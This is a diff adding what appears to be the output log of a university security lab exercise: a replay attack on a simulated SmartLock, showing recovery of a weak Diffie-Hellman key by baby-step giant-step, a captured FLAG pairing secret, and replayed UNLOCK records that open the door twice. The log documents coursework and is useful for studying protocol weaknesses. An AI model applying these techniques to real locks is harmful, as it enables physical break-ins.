@@ -1,0 +1,37 @@
+====================================================
+[*] SmartLock v1 Command Replay Exploit (TASKA5)
+[*] Transcript    : /mnt/c/Users/fahad/Desktop/Projects/Info Sec A2/lab/../23i-0614-G/evidence/taska5_replay/taska5_baseline_stream.txt
+[*] Target        : 10.10.10.11:9030
+[*] Replay count  : 2
+====================================================
+[*] Captured suite : AES256-GCM
+[*] Captured A     : 436048768054
+[*] Captured p/g/B : p=1036603071667 g=2 B=561189784987
+[*] Recovering device exponent b with BSGS...
+[+] BSGS table 1018138 entries (m=1018138), 67.7888 ms
+[+] recovered_dh_b = 3979609765
+[+] shared secret  = 710478759196
+[+] session key    = 000000000000000000000000000000000000000000000000000000a56bd5851c
+[+] Captured greeting: Paired with SmartLock. Pairing secret: FLAG{c3603ab534897940}
+
+[*] Replay 1/2: connecting to 10.10.10.11:9030
+    negotiated suite: AES256-GCM
+    lock DH: p=1036603071667 g=2 B=561189784987
+    replayed captured DHCLIENT A=436048768054
+    greeting: Paired with SmartLock. Pairing secret: FLAG{c3603ab534897940}
+    REPLAYED captured UNLOCK record
+    replay reply: DOOR OPENED (unlock #2)
+    sent captured QUIT record
+
+[*] Replay 2/2: connecting to 10.10.10.11:9030
+    negotiated suite: AES256-GCM
+    lock DH: p=1036603071667 g=2 B=561189784987
+    replayed captured DHCLIENT A=436048768054
+    greeting: Paired with SmartLock. Pairing secret: FLAG{c3603ab534897940}
+    REPLAYED captured UNLOCK record
+    replay reply: DOOR OPENED (unlock #3)
+    sent captured QUIT record
+
+====================================================
+[+] Replay run complete. The lock accepted the captured UNLOCK 2 time(s).
+====================================================
